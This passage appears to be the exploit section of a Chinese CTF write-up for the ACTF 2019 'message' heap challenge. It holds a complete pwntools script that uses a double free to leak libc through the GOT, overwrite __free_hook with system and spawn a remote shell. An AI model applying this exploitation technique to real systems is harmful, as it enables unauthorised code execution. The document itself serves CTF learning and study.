
| 1 2 | `add(0x8,'/bin/sh\x00')` `# 7` `free(7)` |

![image-20201110183639632](https://bbs.kanxue.com/upload/attach/202012/830671_WU69VEF9JAURFJ3.jpg)

### 步骤五：构造exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
    if path == '':
        libc = LibcSearcher(func, leak)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        binsh = base + libc.dump('str_bin_sh')
    else:
        libc = ELF(path)
        base = leak - libc.sym[func]
        system = base + libc.sym['system']
        binsh = base + libc.search('/bin/sh').next()
    return (system, binsh)

s = lambda data : p.send(str(data))
sa = lambda delim,data : p.sendafter(delim, str(data))
sl = lambda data : p.sendline(str(data))
sla = lambda delim,data : p.sendlineafter(delim, str(data))
r = lambda num=4096 : p.recv(num)
ru = lambda delims, drop=True : p.recvuntil(delims, drop)
uu64 = lambda data : u64(data.ljust(8,'\0'))
leak = lambda name,addr : log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './ACTF_2019_message'
context.binary = binary
elf = ELF(binary, checksec=False)
p = remote('node3.buuoj.cn',29230) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
# libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so',checksec=False)

def dbg():
    gdb.attach(p)
    pause()

_add,_free,_edit,_show = 1,2,3,4

def add(size,content='a'):
    sla(':',_add)
    sla(':',size)
    sa(':',content)

def free(index):
    sla(':',_free)
    sla(':',index)

def edit(index,content):
    sla(':',_edit)
    sla(':',index)
    sa(':',content)

def show(index):
    sla(':',_show)
    sla(':',index)

# start
add(0x30) # 0
add(0x20) # 1
add(0x20) # 2
free(1)
free(2)
free(1)
# dbg()
fake = 0x602060 - 0x8
add(0x20,p64(fake)) # 3 <-> 1
# dbg()
add(0x20) # 4 <-> 2
add(0x20) # 5 <-> 1
# dbg()

add(0x20,p64(elf.got['puts'])) # 6 <-> fake
show(0)

ru(': ')
puts = uu64(r(6))
print('puts address:'+hex(puts))

libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
free_hook = base + libc.dump('__free_hook')
# dbg()

print('system address:'+hex(system))
print('freehook address:'+hex(free_hook))

edit(6,p64(free_hook))
# dbg()

edit(0,p64(system))
# dbg()
add(0x8,'/bin/sh\x00') # 7
free(7)
# end

p.interactive()
```

## 参考文献

- [ctf-wiki](https://bbs.kanxue.com/elink@3abK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0W2k6$3W2@1K9s2g2T1i4K6u0W2K9h3!0Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6Y4L8r3W2T1j5#2)9J5k6r3S2W2j5i4m8Q4x3V1k6X3j5i4y4@1j5X3W2F1i4K6g2X3j5i4c8@1j5h3y4C8i4K6u0V1P5X3S2Q4x3V1j5`.)

- f15K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2T1K9h3I4A6j5X3W2D9K9g2)9J5k6h3y4G2L8g2)9J5c8Y4k6A6k6r3g2G2i4K6u0r3b7W2j5I4y4f1f1@1x3e0q4i4y4%4N6e0

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2020-11-30 22:25

被ztree编辑

，原因： 添加附件

上传的附件：

- [ACTF_2019_message.i64](javascript:void(0);)

  （193.49kb，10次下载）

- [ACTF_2019_message](javascript:void(0);)

  （9.99kb，15次下载）
